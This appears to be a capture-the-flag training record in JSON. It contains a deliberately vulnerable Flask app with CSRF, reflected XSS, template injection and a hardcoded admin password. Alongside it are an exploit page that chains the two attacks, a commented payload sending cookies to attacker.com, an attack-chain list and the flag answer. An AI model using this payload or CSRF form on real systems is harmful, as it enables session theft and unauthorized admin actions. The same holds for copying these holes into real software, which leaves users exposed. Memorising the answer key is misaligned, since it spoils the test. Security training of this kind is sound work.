{
  "app_code": "\nfrom flask import Flask, request, render_template_string, session, redirect\nimport secrets\n\napp = Flask(__name__)\napp.secret_key = secrets.token_hex(16)\n\n# Vulnerable admin page (CSRF vulnerable)\n@app.route('/admin/delete', methods=['POST'])\ndef admin_delete():\n    if session.get('admin'):\n        user_id = request.form.get('user_id')\n        # CSRF vulnerable - no token check!\n        return f\"User {user_id} deleted! FLAG{{ch41n_4tt4ck_succ3ss}}\"\n    return \"Access denied\"\n\n# XSS vulnerable comment page\n@app.route('/comment', methods=['GET', 'POST'])\ndef comment():\n    if request.method == 'POST':\n        comment_text = request.form.get('comment', '')\n        # Vulnerable - no sanitization!\n        return render_template_string(f\"\"\"\n            <html><body>\n                <h1>Your Comment:</h1>\n                <div>{comment_text}</div>\n                <a href=\"/comment\">Back</a>\n            </body></html>\n        \"\"\")\n    \n    return \"\"\"\n        <html><body>\n            <h1>Post a Comment</h1>\n            <form method=\"POST\">\n                <textarea name=\"comment\" rows=\"10\" cols=\"50\"></textarea><br>\n                <input type=\"submit\" value=\"Post\">\n            </form>\n        </body></html>\n    \"\"\"\n\n@app.route('/admin/login', methods=['GET', 'POST'])\ndef admin_login():\n    if request.method == 'POST':\n        if request.form.get('password') == 'admin123':\n            session['admin'] = True\n            return redirect('/admin/panel')\n    return \"\"\"\n        <html><body>\n            <h1>Admin Login</h1>\n            <form method=\"POST\">\n                <input name=\"password\" type=\"password\">\n                <input type=\"submit\" value=\"Login\">\n            </form>\n        </body></html>\n    \"\"\"\n\nif __name__ == '__main__':\n    app.run(host='0.0.0.0', port=5002, debug=False)\n",
  "exploit_code": "\n<!DOCTYPE html>\n<html>\n<head><title>Exploit</title></head>\n<body>\n    <h1>XSS+CSRF Chain Exploit</h1>\n    \n    <!-- Step 1: XSS to steal admin session -->\n    <script>\n    // Inject this into comment form:\n    // <img src=x onerror=\"fetch('http://attacker.com/steal?cookie='+document.cookie)\">\n    \n    // Step 2: CSRF to delete user\n    function executeCSRF() {\n        const form = document.createElement('form');\n        form.method = 'POST';\n        form.action = 'http://localhost:5002/admin/delete';\n        \n        const input = document.createElement('input');\n        input.name = 'user_id';\n        input.value = 'victim123';\n        form.appendChild(input);\n        \n        document.body.appendChild(form);\n        form.submit();\n    }\n    </script>\n    \n    <button onclick=\"executeCSRF()\">Execute Attack</button>\n</body>\n</html>\n",
  "url": "http://localhost:5002",
  "attack_chain": [
    "1. XSS in comment field to inject malicious script",
    "2. Steal admin session cookie",
    "3. CSRF to perform admin action",
    "4. Get flag from successful deletion"
  ],
  "flag": "FLAG{ch41n_4tt4ck_succ3ss}"
}